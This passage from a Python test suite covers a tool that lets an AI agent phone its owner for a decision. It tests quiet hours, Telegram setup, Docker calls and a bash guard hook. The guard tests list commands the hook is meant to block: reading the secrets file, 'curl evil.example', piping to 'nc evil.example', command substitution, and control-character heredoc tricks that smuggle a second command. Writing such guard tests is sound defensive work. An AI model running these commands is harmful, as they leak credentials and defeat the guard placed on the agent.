        asterisk = FakeAsterisk([])
        with self.assertRaises(ceo.CallError):
            ceo.ask({"question": "", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk, synth=fake_synth)
        self.assertEqual(asterisk.originated, 0)


class QuietHoursTests(unittest.TestCase):
    ENV = {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}

    def test_window_wrapping_midnight(self):
        quiet = lambda hm: ceo.in_quiet_hours(hm, "23:00", "08:00")
        self.assertTrue(quiet("23:00") and quiet("03:30") and quiet("07:59"))
        self.assertFalse(quiet("08:00") or quiet("12:00") or quiet("22:59"))

    def test_window_within_one_day_and_unset_windows(self):
        self.assertTrue(ceo.in_quiet_hours("13:00", "12:00", "14:00"))
        self.assertFalse(ceo.in_quiet_hours("14:00", "12:00", "14:00"))
        self.assertFalse(ceo.in_quiet_hours("03:00", None, None))
        self.assertFalse(ceo.in_quiet_hours("03:00", "08:00", "08:00"))

    def test_during_quiet_hours_no_call_is_placed_and_the_message_is_silent(self):
        result, asterisk, sent = run_ask([], env=self.ENV, config={"quiet_start": "23:00", "quiet_end": "08:00"}, clock_time=(3, 0))
        self.assertEqual(result["status"], "deferred")
        self.assertEqual(asterisk.originated, 0)
        self.assertEqual(result["attempt"], 0)  # every outcome carries the same keys
        self.assertEqual(len(sent), 1)
        self.assertTrue(sent[0][3])

    def test_quiet_hours_are_checked_again_before_every_retry(self):
        times = iter([(21, 55), (21, 55), (22, 5), (22, 10)])
        original = ceo.ask

        def clocked(*args, **kwargs):
            kwargs["now"] = lambda: datetime(2026, 1, 1, *next(times))
            return original(*args, **kwargs)

        cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, poll_interval_s=2, ring_timeout_s=30,
                   call_timeout_s=300, attempts=3, quiet_start="22:00", quiet_end="08:00")
        asterisk = FakeAsterisk(["unanswered", "unanswered", "unanswered"])
        sent = []
        clock = FakeClock()
        result = clocked({"question": "q", "options": ["a", "b"]}, cfg, self.ENV, asterisk, synth=fake_synth,
                         notifier=lambda t, c, text, silent=False: sent.append(silent) or True,
                         sleep=clock.sleep, clock=clock)
        self.assertEqual(asterisk.originated, 1)
        self.assertEqual(result["status"], "deferred")
        self.assertEqual(sent, [True])  # silent message, no night call

    def test_outside_quiet_hours_the_call_is_placed(self):
        result, asterisk, sent = run_ask(["1"], env=self.ENV, config={"quiet_start": "23:00", "quiet_end": "08:00"}, clock_time=(12, 0))
        self.assertEqual(result["status"], "decided")

    def test_timezone_must_be_a_known_zone(self):
        for bad in ('{"timezone": "Mars/Base"}', '{"timezone": 3}'):
            with self.subTest(bad=bad):
                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
                handle.write(bad)
                handle.close()
                self.addCleanup(os.unlink, handle.name)
                with self.assertRaises(ceo.CallError):
                    ceo.load_config(handle.name)

    def test_the_poll_interval_is_bounded_so_a_run_stays_below_the_sweep_age(self):
        for bad in ('{"poll_interval_s": 1000}', '{"poll_interval_s": 61}',
                    '{"attempts": 10, "poll_interval_s": 60, "call_timeout_s": 3600, "retry_delay_s": 3600}'):
            with self.subTest(bad=bad):
                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
                handle.write(bad)
                handle.close()
                self.addCleanup(os.unlink, handle.name)
                with self.assertRaises(ceo.CallError):
                    ceo.load_config(handle.name)

    def test_heads_up_and_delays_are_validated(self):
        for bad in ('{"heads_up_s": "90"}', '{"heads_up_s": -1}', '{"heads_up_s": true}', '{"retry_delay_s": 100000}',
                    '{"attempts": 10, "retry_delay_s": 3600, "heads_up_s": 3600, "call_timeout_s": 3600}'):
            with self.subTest(bad=bad):
                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
                handle.write(bad)
                handle.close()
                self.addCleanup(os.unlink, handle.name)
                with self.assertRaises(ceo.CallError):
                    ceo.load_config(handle.name)

    def test_the_port_must_be_a_real_tcp_port(self):
        for bad in ('{"piper_port": 70000}', '{"piper_port": 0}'):
            with self.subTest(bad=bad):
                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
                handle.write(bad)
                handle.close()
                self.addCleanup(os.unlink, handle.name)
                with self.assertRaises(ceo.CallError):
                    ceo.load_config(handle.name)

    def test_an_out_of_range_port_in_synthesize_is_a_clean_error(self):
        with self.assertRaises(ceo.CallError):
            ceo.synthesize("127.0.0.1", 70000, "hola", timeout=1)

    def test_a_zero_poll_interval_is_refused(self):
        handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
        handle.write('{"poll_interval_s": 0}')
        handle.close()
        self.addCleanup(os.unlink, handle.name)
        with self.assertRaises(ceo.CallError):
            ceo.load_config(handle.name)

    def test_quiet_hours_use_the_configured_timezone(self):
        import unittest.mock as mock

        class FakeDatetime:
            seen = []

            @staticmethod
            def now(zone=None):
                FakeDatetime.seen.append(zone)
                return datetime(2026, 1, 1, 23, 30)

        asterisk = FakeAsterisk([])
        config = dict(ceo.DEFAULT_CONFIG, quiet_start="22:00", quiet_end="07:00", timezone="Europe/Madrid")
        with mock.patch.object(ceo, "datetime", FakeDatetime):
            result = ceo.ask({"question": "q", "options": ["a", "b"]}, config, {}, asterisk, synth=fake_synth)
        self.assertEqual(result["status"], "deferred")
        self.assertEqual(str(FakeDatetime.seen[0]), "Europe/Madrid")

    def test_config_requires_both_ends(self):
        for cfg in ('{"quiet_start": "23:00"}', '{"quiet_start": "25:00", "quiet_end": "08:00"}', '{"quiet_start": "23:00", "quiet_end": 8}'):
            with self.subTest(cfg=cfg):
                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
                handle.write(cfg)
                handle.close()
                self.addCleanup(os.unlink, handle.name)
                with self.assertRaises(ceo.CallError):
                    ceo.load_config(handle.name)


class HeadsUpTests(unittest.TestCase):
    ENV = {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}

    def setup(self, registered, env=None, heads_up_s=90):
        asterisk = FakeAsterisk([])
        asterisk.registered = registered
        clock = FakeClock()
        sent = []
        config = dict(ceo.DEFAULT_CONFIG, heads_up_s=heads_up_s, poll_interval_s=2)
        result = ceo.wait_for_phone(asterisk, config, self.ENV if env is None else env,
                                    lambda token, chat, text, silent=False: sent.append(text), clock.sleep, clock)
        return result, sent, clock

    def test_a_registered_phone_gets_no_message_and_no_wait(self):
        result, sent, clock = self.setup(True)
        self.assertEqual((result, sent, clock.now), (True, [], 0))

    def test_an_unregistered_phone_is_messaged_once_and_waited_for(self):
        reads = iter([False, False, False, True])
        result, sent, clock = self.setup(lambda: next(reads))
        self.assertTrue(result)
        self.assertEqual(sent, [ceo.HEADS_UP])
        self.assertGreater(clock.now, 0)

    def test_giving_up_after_the_window(self):
        result, sent, clock = self.setup(False)
        self.assertFalse(result)
        self.assertEqual(len(sent), 1)
        self.assertGreaterEqual(clock.now, 90)
        self.assertLess(clock.now, 95)

    def test_without_chat_settings_or_with_the_window_off_nothing_is_sent_or_waited(self):
        for env, heads_up in (({}, 90), (None, 0)):
            with self.subTest(env=env, heads_up=heads_up):
                result, sent, clock = self.setup(False, env=env, heads_up_s=heads_up)
                self.assertEqual((result, sent, clock.now), (False, [], 0))

    def test_the_message_goes_out_before_the_call_and_only_when_the_phone_is_missing(self):
        events = []

        def notifier(token, chat, text, silent=False):
            events.append("message: " + text)
            return True

        original_originate, original_init = FakeAsterisk.originate, FakeAsterisk.__init__

        def originate(self_, name, call_file):
            events.append("call")
            original_originate(self_, name, call_file)

        def init(self_, script):
            original_init(self_, script)
            reads = iter([False, True, True, True])
            self_.registered = lambda: next(reads)

        FakeAsterisk.originate, FakeAsterisk.__init__ = originate, init
        try:
            result, _, _ = run_ask(["1"], env=self.ENV, notifier=notifier)
        finally:
            FakeAsterisk.originate, FakeAsterisk.__init__ = original_originate, original_init
        self.assertEqual(result["status"], "decided")
        self.assertEqual(events, ["message: " + ceo.HEADS_UP, "call"])

    def test_a_phone_that_never_registers_is_not_dialled_and_the_owner_is_told(self):
        original_init = FakeAsterisk.__init__

        def init(self_, script):
            original_init(self_, script)
            self_.registered = False

        FakeAsterisk.__init__ = init
        try:
            result, asterisk, sent = run_ask([], env=self.ENV, config={"heads_up_s": 10})
        finally:
            FakeAsterisk.__init__ = original_init
        self.assertEqual(asterisk.originated, 0)
        self.assertEqual((result["status"], result["reason"], result["attempt"]), ("unanswered", "phone_not_registered", 1))
        self.assertTrue(result["notified"])
        self.assertEqual(len(sent), 2)  # one heads-up, one final notification
        self.assertEqual(asterisk.files, {})


    def test_the_heads_up_is_sent_once_per_run_even_if_the_phone_drops_again(self):
        asterisk = FakeAsterisk([])
        clock = FakeClock()
        sent = []
        config = dict(ceo.DEFAULT_CONFIG, heads_up_s=4, poll_interval_s=2)
        state = {}
        for _ in range(3):
            asterisk.registered = False
            ceo.wait_for_phone(asterisk, config, self.ENV, lambda token, chat, text, silent=False: sent.append(text), clock.sleep, clock, state)
        self.assertEqual(sent, [ceo.HEADS_UP])


        result, _, sent = run_ask(["1"], env=self.ENV)
        self.assertEqual((result["status"], sent), ("decided", []))


class DockerStateTests(unittest.TestCase):
    def asterisk(self, returncode, stdout=b"", stderr=b""):
        class Result:
            pass

        result = Result()
        result.returncode, result.stdout, result.stderr = returncode, stdout, stderr
        return ceo.DockerAsterisk("asterisk", run=lambda command, **kwargs: result)

    def test_a_missing_file_means_no_marker_yet(self):
        # Detected by exit code, so a translated "No such file" message (non-C locale) still works.
        self.assertIsNone(self.asterisk(3, stderr=b"cat: /x: No existe el fichero o el directorio").read_file("/x"))

    def test_the_read_command_uses_a_file_test_not_error_text(self):
        seen = []

        class Result:
            returncode, stdout, stderr = 0, b"1", b""

        ceo.DockerAsterisk("asterisk", run=lambda command, **kwargs: seen.append(command) or Result()).read_file("/x")
        self.assertIn("-e", " ".join(seen[0]))

    def test_a_docker_failure_is_an_error_not_a_missing_marker(self):
        for stderr in (b"Error response from daemon: container is not running", b"", b"Cannot connect to the Docker daemon", b"cat: /x: No such file or directory"):
            with self.subTest(stderr=stderr):
                with self.assertRaises(ceo.CallError):
                    self.asterisk(1, stderr=stderr).read_file("/x")

    def test_endpoint_match_is_exact(self):
        contacts = (b" Contact:  phone2/sip:u@192.0.2.1:5060;ob   abc Avail  1.0\n"
                    b" Contact:  phone-old/sip:u@192.0.2.1:5061   abc Avail  1.0\n")
        self.assertFalse(self.asterisk(0, contacts).endpoint_available("PJSIP/phone"))
        self.assertTrue(self.asterisk(0, contacts + b" Contact:  phone/sip:u@192.0.2.2:5060;ob   abc Avail  1.0\n").endpoint_available("PJSIP/phone"))
        self.assertFalse(self.asterisk(0, b" Contact:  phone/sip:u@192.0.2.2:5060;ob   abc Unavail  nan\n").endpoint_available("PJSIP/phone"))

    def test_a_failed_asterisk_command_is_an_error_not_an_empty_contact_list(self):
        with self.assertRaises(ceo.CallError):
            self.asterisk(1, stderr=b"Error: No such container: asterisk").endpoint_available("PJSIP/phone")

    def test_a_registered_contact_without_qualify_counts_as_available(self):
        self.assertTrue(self.asterisk(0, b" Contact:  phone/sip:u@192.0.2.2:5060;ob   abc NonQual  nan\n").endpoint_available("PJSIP/phone"))

    def test_stale_folders_older_than_a_day_are_swept(self):
        seen = []

        class Result:
            returncode, stdout, stderr = 0, b"", b""

        ceo.DockerAsterisk("asterisk", run=lambda command, **kwargs: seen.append(command) or Result()).sweep_stale()
        command = seen[0]
        self.assertIn("+1440", command)
        self.assertEqual(command[command.index("find") + 1], "/var/spool/asterisk/ceo")


class DockerAsteriskTests(unittest.TestCase):
    def test_commands_run_as_the_asterisk_user_without_a_shell_from_text(self):
        calls = []

        class Result:
            returncode = 0
            stdout = b" 3 \n"

        def run(command, **kwargs):
            calls.append((command, kwargs.get("input")))
            return Result()

        asterisk = ceo.DockerAsterisk("asterisk", run=run)
        asterisk.write_file("/var/spool/asterisk/ceo/x/prompt.wav", b"RIFF")
        self.assertEqual(asterisk.read_file("/var/spool/asterisk/ceo/x/result"), "3")
        asterisk.originate("ceo-abc", "Channel: PJSIP/phone\n")
        self.assertEqual(calls[0][0][:6], ["docker", "exec", "-i", "-u", "asterisk", "asterisk"])
        self.assertEqual(calls[0][1], b"RIFF")
        self.assertEqual(calls[0][0][-2:], ["sh", "/var/spool/asterisk/ceo/x/prompt.wav"])
        self.assertEqual(calls[-1][0][-3:], ["mv", "/var/spool/asterisk/tmp/ceo-abc.call", "/var/spool/asterisk/outgoing/ceo-abc.call"])


class DialplanTests(unittest.TestCase):
    """The dialplan cannot run here, so pin the order of the steps that protect the decision."""

    def setUp(self):
        path = SCRIPT.parent.parent / "dialplan" / "ceo-ask.conf"
        self.lines = [line.strip() for line in path.read_text().splitlines()]

    def index(self, fragment):
        matches = [i for i, line in enumerate(self.lines) if fragment in line]
        self.assertEqual(len(matches), 1, fragment)
        return matches[0]

    def test_ids_are_validated_before_anything_else_runs(self):
        self.assertLess(self.index('REGEX("^[0-9a-f]+$" ${CEO_ID})} = 0]?bad'), self.index("Answer()"))
        self.assertLess(self.index('REGEX("^[1-8]$" ${CEO_OPTIONS})'), self.index("Answer()"))

    def test_the_result_is_written_only_after_the_confirmation_key(self):
        confirm_read = self.index("Read(CONFIRM")
        gate = self.index('"${CONFIRM}" != "1"')
        write = self.index("Set(FILE(${CEO_DIR}/result)=${CHOICE})")
        self.assertLess(confirm_read, gate)
        self.assertLess(gate, write)

    def test_a_choice_must_be_a_valid_option_before_it_is_read_back(self):
        self.assertLess(self.index('REGEX("^[1-8]$" ${CHOICE})'), self.index("Read(CONFIRM"))
        self.assertLess(self.index("${CHOICE} > ${CEO_OPTIONS}"), self.index("Read(CONFIRM"))

    def test_rounds_are_capped_and_the_end_of_call_marker_is_always_written(self):
        self.index("${ROUND} > 3")
        self.index("(giveup),Set(FILE(${CEO_DIR}/result)=undecided)")
        self.assertTrue(any(line.startswith("exten => h,1") for line in self.lines))


class CliTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.request = Path(self.tmp.name) / "request.json"
        self.request.write_text(json.dumps({"question": "Ship it?", "options": ["Yes", "No"]}))
        self.config = Path(self.tmp.name) / "config.json"
        self.config.write_text(json.dumps({"env_file": str(Path(self.tmp.name) / "env")}))
        self.originals = (ceo.DockerAsterisk, ceo.synthesize)
        self.addCleanup(self.restore)
        ceo.synthesize = fake_synth

    def restore(self):
        ceo.DockerAsterisk, ceo.synthesize = self.originals

    def run_main(self, argv, script=None):
        import contextlib
        script = script if script is not None else ["2"]
        ceo.DockerAsterisk = lambda container: FakeAsterisk(script)
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = ceo.main(["--config", str(self.config)] + argv)
        return code, out.getvalue(), err.getvalue()

    def test_a_confirmed_decision_exits_zero_and_prints_one_json_line(self):
        code, out, _ = self.run_main(["ask", "--request", str(self.request)])
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out)["option"], "No")

    def test_a_pending_decision_exits_three(self):
        code, out, _ = self.run_main(["ask", "--request", str(self.request)], script=["undecided"])
        self.assertEqual(code, 3)
        self.assertEqual(json.loads(out)["status"], "undecided")

    def test_input_problems_exit_one_with_an_error_line_and_no_traceback(self):
        for argv in (["ask", "--request", str(Path(self.tmp.name) / "missing.json")],):
            code, out, err = self.run_main(argv)
            self.assertEqual(code, 1)
            self.assertTrue(err.startswith("ERROR:"))
            self.assertNotIn("Traceback", err)
        bad = Path(self.tmp.name) / "bad.json"
        bad.write_text("{")
        code, _, err = self.run_main(["ask", "--request", str(bad)])
        self.assertEqual(code, 1)
        self.assertTrue(err.startswith("ERROR:"))

    def test_test_call_reads_the_public_domain_passage_and_can_ignore_quiet_hours(self):
        import unittest.mock as mock

        class FakeDatetime:
            @staticmethod
            def now(zone=None):
                return datetime(2026, 1, 1, 3, 0)

        self.config.write_text(json.dumps({"env_file": str(Path(self.tmp.name) / "env"), "quiet_start": "22:00", "quiet_end": "07:00"}))
        spoken = []
        ceo.synthesize = lambda host, port, text, **kw: spoken.append(text) or fake_synth(host, port, text)
        with mock.patch.object(ceo, "datetime", FakeDatetime):
            code, out, _ = self.run_main(["test-call"], script=["1"])
            self.assertEqual((code, json.loads(out)["status"]), (3, "deferred"))
            code, out, _ = self.run_main(["test-call", "--ignore-quiet-hours"], script=["1"])
        self.assertEqual((code, json.loads(out)["status"]), (0, "decided"))
        self.assertTrue(any("Cervantes" in text and "En un lugar de la Mancha" in text for text in spoken))

    def test_the_test_passage_is_a_valid_request(self):
        clean = ceo.validate_request({"question": ceo.TEST_PASSAGE, "options": ceo.TEST_OPTIONS})
        self.assertIn("dominio público", clean["question"])

    def test_check_reports_a_registered_phone(self):
        for registered, expected in ((True, 0), (False, 0)):
            with self.subTest(registered=registered):
                class Fake(FakeAsterisk):
                    def endpoint_available(self, endpoint):
                        return registered

                import contextlib
                ceo.DockerAsterisk = lambda container: Fake([])
                out = io.StringIO()
                with contextlib.redirect_stdout(out):
                    code = ceo.main(["--config", str(self.config), "check"])
                self.assertEqual(code, expected)
                self.assertIn("speech: ok", out.getvalue())

    def test_check_exits_1_only_for_a_real_failure_not_for_a_sleeping_phone(self):
        import contextlib

        class Broken(FakeAsterisk):
            def endpoint_available(self, endpoint):
                raise ceo.CallError("docker is not reachable")

        ceo.DockerAsterisk = lambda container: Broken([])
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = ceo.main(["--config", str(self.config), "check"])
        self.assertEqual(code, 1)
        self.assertIn("FAILED", out.getvalue())

    def run_ask_cli(self, *args, stdin=None):
        import contextlib
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code = ceo.main(["--config", str(self.config), "ask", *args])
        return code, err.getvalue()

    def test_a_request_must_be_a_small_regular_file(self):
        code, err = self.run_ask_cli("--request", "/dev/zero")
        self.assertEqual(code, 1)
        self.assertIn("ERROR:", err)
        big = Path(self.tmp.name) / "big.json"
        big.write_bytes(b" " * (ceo.MAX_REQUEST_BYTES + 1))
        code, err = self.run_ask_cli("--request", str(big))
        self.assertEqual(code, 1)
        self.assertIn("ERROR:", err)
        code, err = self.run_ask_cli("--request", str(Path(self.tmp.name)))  # a directory
        self.assertEqual(code, 1)

    def test_the_stdin_limit_counts_bytes_not_characters(self):
        import unittest.mock as mock
        text = "é" * (ceo.MAX_REQUEST_BYTES // 2 + 10)  # fewer characters than the limit, more bytes
        with mock.patch.object(ceo.sys, "stdin", io.StringIO(text)):
            code, err = self.run_ask_cli("--request", "-")
        self.assertEqual(code, 1)
        self.assertIn("longer than", err)

    def test_a_huge_stdin_request_is_cut_off(self):
        import unittest.mock as mock
        with mock.patch.object(ceo.sys, "stdin", io.StringIO(" " * (ceo.MAX_REQUEST_BYTES + 10))):
            code, err = self.run_ask_cli("--request", "-")
        self.assertEqual(code, 1)
        self.assertIn("ERROR:", err)

    def test_a_request_that_is_not_utf8_is_a_clean_error(self):
        import contextlib
        path = Path(self.tmp.name) / "bad.json"
        path.write_bytes(b"\xff\xfe{")
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code = ceo.main(["--config", str(self.config), "ask", "--request", str(path)])
        self.assertEqual(code, 1)
        self.assertIn("ERROR:", err.getvalue())

    def test_check_says_a_missing_phone_is_handled_by_ask(self):
        import contextlib

        class Asleep(FakeAsterisk):
            def endpoint_available(self, endpoint):
                return False

        ceo.DockerAsterisk = lambda container: Asleep([])
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            ceo.main(["--config", str(self.config), "check"])
        self.assertIn("NOT registered", out.getvalue())
        self.assertIn("heads-up", out.getvalue())

    def run_telegram_setup(self, answers):
        """answers maps a bot API method to the JSON the service returns."""
        import contextlib
        import unittest.mock as mock
        env = Path(self.tmp.name) / "env"
        env.write_text("CEO_TELEGRAM_TOKEN=SECRETTOKEN\n")
        os.chmod(env, 0o600)

        class Response(io.BytesIO):
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        def fake_urlopen(url, timeout):
            method = url.rsplit("/", 1)[1]
            return Response(json.dumps(answers[method]).encode())

        out = io.StringIO()
        with mock.patch.object(ceo.urllib.request, "urlopen", fake_urlopen):
            with contextlib.redirect_stdout(out):
                code = ceo.main(["--config", str(self.config), "telegram-setup"])
        return code, out.getvalue()

    @staticmethod
    def answers(updates, webhook=""):
        return {
            "getMe": {"ok": True, "result": {"username": "my_bot"}},
            "getWebhookInfo": {"ok": True, "result": {"url": webhook}},
            "getUpdates": {"ok": True, "result": updates},
        }

    def test_telegram_setup_prints_the_chat_id_and_never_the_token(self):
        update = {"message": {"chat": {"id": 4242, "type": "private", "first_name": "Someone"}}}
        code, out = self.run_telegram_setup(self.answers([update]))
        self.assertEqual(code, 0)
        self.assertIn("@my_bot", out)
        self.assertIn("CEO_TELEGRAM_CHAT_ID=4242", out)
        self.assertNotIn("SECRETTOKEN", out)
        self.assertNotIn("Someone", out)

    def test_telegram_setup_without_messages_names_the_bot_to_write_to(self):
        code, out = self.run_telegram_setup(self.answers([]))
        self.assertEqual(code, 1)
        self.assertIn("@my_bot", out)
        self.assertIn("press Start", out)

    def test_telegram_setup_reports_a_webhook_that_blocks_updates(self):
        code, out = self.run_telegram_setup(self.answers([], webhook="https://example.invalid/hook"))
        self.assertEqual(code, 1)
        self.assertIn("webhook", out)
        self.assertNotIn("example.invalid", out)

    def test_telegram_setup_reads_other_kinds_of_update(self):
        code, out = self.run_telegram_setup(self.answers([{"my_chat_member": {"chat": {"id": 77, "type": "private"}}}]))
        self.assertIn("CEO_TELEGRAM_CHAT_ID=77", out)

    def test_telegram_setup_non_object_body_is_a_clean_error(self):
        import contextlib
        import unittest.mock as mock
        env = Path(self.tmp.name) / "env"
        env.write_text("CEO_TELEGRAM_TOKEN=SECRETTOKEN\n")
        os.chmod(env, 0o600)

        class Response(io.BytesIO):
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        err = io.StringIO()
        with mock.patch.object(ceo.urllib.request, "urlopen", lambda url, timeout: Response(b"null")), contextlib.redirect_stderr(err):
            code = ceo.main(["--config", str(self.config), "telegram-setup"])
        self.assertEqual(code, 1)
        self.assertIn("ERROR:", err.getvalue())

    def test_telegram_setup_unexpected_result_shapes_are_clean_errors(self):
        import contextlib
        for answers in (
            {"getMe": {"ok": True, "result": []}},
            {"getMe": {"ok": True, "result": {"username": "b"}}, "getWebhookInfo": {"ok": True, "result": [1]}},
            {"getMe": {"ok": True, "result": {"username": "b"}}, "getWebhookInfo": {"ok": True, "result": {"url": ""}}, "getUpdates": {"ok": True, "result": {"a": 1}}},
        ):
            with self.subTest(answers=answers):
                err = io.StringIO()
                with contextlib.redirect_stderr(err):
                    code, _ = self.run_telegram_setup(answers)
                self.assertEqual(code, 1)
                self.assertIn("ERROR:", err.getvalue())

    def test_telegram_setup_warns_when_several_chats_wrote_to_the_bot(self):
        updates = [{"message": {"chat": {"id": 1, "type": "private"}}}, {"message": {"chat": {"id": 2, "type": "private"}}}]
        code, out = self.run_telegram_setup(self.answers(updates))
        self.assertEqual(code, 0)
        self.assertIn("2 chats", out)
        self.assertIn("CEO_TELEGRAM_CHAT_ID=1", out)
        self.assertIn("CEO_TELEGRAM_CHAT_ID=2", out)
        self.assertLess(out.index("=1"), out.index("=2"))  # oldest first, newest last
        self.assertIn("most recent", out)

    def test_telegram_setup_refused_token_is_a_clean_error(self):
        import contextlib
        import unittest.mock as mock
        env = Path(self.tmp.name) / "env"
        env.write_text("CEO_TELEGRAM_TOKEN=SECRETTOKEN\n")
        os.chmod(env, 0o600)

        def refuse(url, timeout):
            raise OSError("401 for " + url)

        err = io.StringIO()
        with mock.patch.object(ceo.urllib.request, "urlopen", refuse), contextlib.redirect_stderr(err):
            code = ceo.main(["--config", str(self.config), "telegram-setup"])
        self.assertEqual(code, 1)
        self.assertNotIn("SECRETTOKEN", err.getvalue())


class GuardTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        path = SCRIPT.parent / "guard_bash.py"
        spec_ = importlib.util.spec_from_file_location("guard_bash", path)
        cls.guard = importlib.util.module_from_spec(spec_)
        spec_.loader.exec_module(cls.guard)

    def test_the_script_invocations_are_allowed(self):
        for command in (
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check",
            "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check",
            "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config /home/u/.config/ceo-call/config.json check",
            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' check",
            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '~/.config/ceo-call/c.json' ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
            "/home/u/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{\"question\": \"Ship it?\", \"options\": [\"a\", \"b\"]}\nCEO_REQUEST",
        ):
            with self.subTest(command=command):
                self.assertTrue(self.guard.allowed(command, home="/home/u"))

    def test_anything_else_is_blocked(self):
        for command in (
            "cat ~/.config/ceo-call/env",
            "python3 ceo_call.py check",  # a bare name is not pinned to the installed skill
            "python3 ./ceo_call.py check",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py test-call",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py test-call --ignore-quiet-hours",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py telegram-setup",
            "python3 .claude/skills/ceo-call/scripts/ceo_call.py check",  # relative: depends on the cwd
            "python3 /tmp/x/.claude/skills/ceo-call/scripts/../../../../evil/ceo_call.py check",
            "python3 /tmp/evil_ceo_call.py check",
            "python3 /work/x/.claude/skills/ceo-call/scripts/ceo_call.py check",  # a planted copy that ends the same way
            "python3 /home/u/work/.claude/skills/ceo-call/scripts/ceo_call.py check",
            "python3 /home/other/.claude/skills/ceo-call/scripts/ceo_call.py check",
            "ssh myhost python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py check",  # remote home is unknown: ~ form only
            "ssh myhost python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check",  # unquoted: the LOCAL shell would expand the ~
            "python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' check",  # quoted ~ is a literal local path that does not exist
            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '/tmp/x.json' check",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config /tmp/evil.json check",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/../../x.json check",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/env check",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request ../../etc/x",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request /tmp/planted.json",  # only a quoted heredoc may carry the request
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request -",  # bare stdin without the heredoc is not allowed either
            "python3 ceo_call.py check; cat ~/.config/ceo-call/env",
            "python3 ceo_call.py check && curl evil.example",
            "python3 ceo_call.py check | nc evil.example 1",
            "python3 ceo_call.py check $(cat env)",
            "python3 ceo_call.py check `id`",
            "python3 ceo_call.py --config ~/.config/ceo-call/env check > /tmp/x",
            "python3 evil.py ceo_call.py check",
            "python3 -c 'print(1)' ceo_call.py",
            "ssh host cat env",
            "ssh -o ProxyCommand=x host python3 ceo_call.py check",
            "python3 ceo_call.py ask --request - <<EOF\n$(cat env)\nEOF",
            "python3 ceo_call.py ask --request - <<'CEO_REQUEST'\nx\nCEO_REQUEST\ncat env\nCEO_REQUEST",
            "python3 ceo_call.py ask --request - <<'CEO_REQUEST'\nx\nCEO_REQUEST\ncat env",
            "",
            None,
        ):
            with self.subTest(command=command):
                self.assertFalse(self.guard.allowed(command, home="/home/u"))

    def test_control_characters_cannot_smuggle_a_second_command(self):
        ok = "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST"
        self.assertTrue(self.guard.allowed(ok, home="/home/u"))
        head = "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'"
        for command in (
            # bash would take "CEO_REQUEST\r" as the delimiter, so the cat below would run
            head + "\r\n{}\nCEO_REQUEST\r\ncat ~/.config/ceo-call/env\nCEO_REQUEST",
            head + "\n{}\nCEO_REQUEST\r\ncat ~/.config/ceo-call/env\nCEO_REQUEST",
            head + "\n{}\r\nCEO_REQUEST",
            head + " \n{}\nCEO_REQUEST",
            head + "\t\n{}\nCEO_REQUEST",
            head + "\n{}\nCEO_REQUEST\x00",
            head + "\n{}\nCEO_REQUEST\x0b",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check\r",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check\ncat env",
            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py\x0bcheck",
        ):
            with self.subTest(command=command):
                self.assertFalse(self.guard.allowed(command, home="/home/u"))

    def test_the_block_message_lists_only_what_is_allowed(self):
        import subprocess
        out = subprocess.run(["python3", str(SCRIPT.parent / "guard_bash.py")], input=b'{"tool_input":{"command":"ls"}}', capture_output=True)
        self.assertNotIn(b"test-call", out.stderr)

    def test_the_agent_is_told_to_run_ask_in_the_background(self):
        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
        self.assertIn("run_in_background", agent)

    def test_the_agent_preloads_the_skill_and_gets_the_host_from_the_brief(self):
